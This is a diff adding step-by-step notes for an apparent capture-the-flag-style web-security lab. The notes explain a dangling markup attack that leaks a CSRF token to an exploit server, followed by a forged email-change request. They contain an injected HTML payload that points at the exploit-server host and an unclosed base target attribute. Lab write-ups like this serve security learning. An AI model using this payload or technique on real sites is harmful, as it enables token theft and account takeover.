@@ -1,0 +1,15 @@
+STEPS HOW THIS WORKS:
+
+1. Go to the exploit server and paste the content inside the body.html to the body
+?email="><a href="https://exploit-0a9100ac04e77262815620e7012f0069.exploit-server.net/exploit">CLick me</a><base target="
+-> the exploit server will send the content of the lab including the "Click me" a tag and a base tag that has been injected via the email value
+
+2. The victim clicks on the "Click me" tag and will be redirected to the exploit server together with the "window.name" value
+getting from the "target" attribute of the base tag. But because the "target" attribute was not closed, this leads to the dangling markup attack
+where the content below will be leaked until the next ", including the csrf token.
+
+3. When the victim visits the exploit server the script is running again and got the "window.name" value. It then make a GET request to itself
+with the csrf token via the Image().src.
+-> You can then view the csrf token in the log of the exploit server
+
+4. Then make the victim sends a POST request to change it's email using the post.html by sending another attack using the exploit server
